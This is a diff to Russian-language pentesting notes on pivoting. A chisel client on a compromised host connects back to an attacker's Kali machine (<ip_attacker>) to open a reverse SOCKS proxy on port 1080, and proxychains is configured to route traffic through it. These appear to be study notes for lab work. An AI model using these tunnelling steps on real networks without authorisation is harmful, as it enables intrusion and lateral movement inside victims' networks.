@@ -15,18 +15,17 @@
 
 1) На свое машине запускается `chisel` сервер, который способен принимать подключения 
 ```bash
-chisel server -p <port_attacker> -reverse
+./chisel server -v -p <port_attacker> -reverse --socks5
 ```
 
 2) Со скомпрометированного хоста подключаемся до нашей машине `Kali` через `chisel` клиент
-```powershell
-./chisel.exe client <ip_attacker>:<port_attacker> R:1080:socks
+```bash
+./chisel client -v <ip_attacker>:<port_attacker> R:1080:socks
 ```
 
  Теперь у нас доступен `SOCKS Proxy` через 1080 порт
 
 Настроим `Proxychains`
-
 ## Использование Proxychains
 
 В файл
@@ -34,7 +33,7 @@ chisel server -p <port_attacker> -reverse
 nano /etc/proxychains4.conf
 ```
 Добавить:
-```
+```bash
 socks5 127.0.0.1 1080
 ```
 
